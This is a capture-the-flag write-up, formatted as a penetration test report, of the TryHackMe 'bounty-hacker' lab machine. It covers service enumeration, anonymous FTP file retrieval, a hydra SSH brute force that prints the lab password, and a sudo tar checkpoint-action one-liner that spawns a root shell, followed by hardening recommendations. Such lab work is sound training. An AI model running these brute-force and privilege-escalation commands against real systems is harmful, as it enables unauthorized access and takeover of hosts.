# Bounty Hacker CTF


## Executive summary
Anonymous FTP Access: The system's FTP server permitted anonymous access, which could allow malicious actors to retrieve sensitive files, in this case, potential passwords and usernames.
SSH Vulnerability: A brute force attack on the SSH service using the revealed credentials was successful, indicating a weak password security mechanism in place.
Privilege Escalation: The system had misconfigured user permissions, enabling an authenticated user to gain full root access through command manipulation.

## **Penetration Testing Report**
### **Introduction:**

This report details the penetration test performed on the target system with IP address 10.10.207.64, known as "bounty-hacker" from the TryHackMe platform. Our objective was to identify vulnerabilities and exploit them to gain unauthorized access.

### **Scope:**
- **Date**: 9/28/2023
- **Target System**: 10.10.207.64
- **Platform**: TryHackMe
- **Challenge Name**: bounty-hacker

### **Findings:**

### 1. Service Enumeration:

Using the **`nmap`** scan, we identified three open ports:

```yaml
──(root㉿kali)-[~/bounty-hacker]
└─$ nmap -A -oN bounty_scan.txt 10.10.207.64
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-28 20:39 CEST
Nmap scan report for 10.10.207.64
Host is up (0.058s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.83
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.67 seconds
```

- 21/tcp: FTP (vsFTPd 3.0.3) with anonymous login allowed
- 22/tcp: SSH (OpenSSH 7.2p2 Ubuntu 4ubuntu2.8)
- 80/tcp: HTTP (Apache httpd 2.4.18)

### 2. FTP Exploration:

Anonymous login was allowed on the FTP server. Files retrieved from the server:

```yaml
ftp> ls -l
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

- **`locks.txt`**: Possibly a list of passwords.
- **`task.txt`**: Contained tasks and revealed the username "lin".
    
    ```yaml
    ┌──(root㉿kali)-[bounty-hacker]
    └─# cat task.txt                                                                                                                          
    1.) Protect Vicious.
    2.) Plan for Red Eye pickup on the moon.
    
    -lin
    ```
    

### 3. Web Service Exploration:

**`gobuster`** identified the **`/images`** directory, but nothing of significant interest was found in this directory.

```yaml
┌──(root㉿kali)-[bounty-hacker]
└─# gobuster dir -w /usr/share/wordlists/dirb/big.txt --url http://10.10.207.64                                                           
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.207.64/images/]
/server-status        (Status: 403) [Size: 277]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished

```

### 4. SSH Brute Force:

Using **`hydra`**, we performed a brute force attack on the SSH service with the username "lin" and the password list from **`locks.txt`**. This successfully revealed the password for "lin" as **`RedDr4gonSynd1cat3`**.

```yaml
┌──(root㉿kali)-[bounty-hacker]
└─# hydra -l lin -P locks.txt 10.10.207.64 ssh -t 16                                                                                     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-28 21:04:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.207.64:22/
[22][ssh] host: 10.10.207.64   login: lin   password: RedDr4gonSynd1cat3
```

```yaml
┌──(root㉿kali)-[bounty-hacker]
└─# ssh lin@10.10.207.64
lin@10.10.207.64's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
```

### 5. Privilege Escalation:

```yaml
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

After gaining SSH access, we found that user "lin" can run **`/bin/tar`** as root without a password, as revealed by **`sudo -l`**. By leveraging this, we executed **`tar`** with the **`--checkpoint-action=exec`** option to spawn a shell with root privileges.

```yaml
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
```

### **Conclusion:**

The system "bounty-hacker" had multiple vulnerabilities:

1. Anonymous FTP access that revealed potential usernames and password lists.
2. Weak password for the SSH user "lin".
3. Misconfigured sudo permissions allowing the execution of **`tar`** as root.

Successfully exploiting these vulnerabilities allowed us to escalate privileges and obtain root access to the target system.

### **Recommendations:**

1. **Secure FTP**: Disable anonymous login on the FTP server and ensure that it uses only necessary accounts with strong, unique passwords.
2. **SSH Hardening**: Use strong and unique passwords. Consider implementing SSH keys for authentication and disabling password-based authentication.
3. **Sudo Permissions**: Review and restrict **`sudo`** permissions. Ensure users can only run necessary commands and avoid giving access to commands that can be exploited for privilege escalation.
4. **Regular Patching**: Ensure that all services and the operating system are updated regularly to avoid known vulnerabilities.

---

This report is a brief overview of the steps taken during the challenge and the vulnerabilities found. It's important to understand that in a real-world scenario, much more detailed documentation, including risk assessments and potential business impacts, would be required.